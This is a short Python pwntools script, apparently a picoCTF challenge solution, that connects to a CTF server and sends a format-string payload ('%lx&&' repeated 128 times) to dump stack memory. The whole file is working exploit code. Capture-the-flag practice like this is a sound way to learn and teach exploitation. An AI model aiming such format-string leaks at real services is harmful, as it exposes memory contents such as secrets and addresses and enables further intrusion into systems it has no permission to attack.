from pwn import *
HOST = "mimas.picoctf.net"
PORT = 56660

with remote(HOST, PORT) as r:
    print(r.recv().decode())
    r.sendline(b"%lx&&" * 128)
    print(r.recv())
    # print(text)
    # print(text)
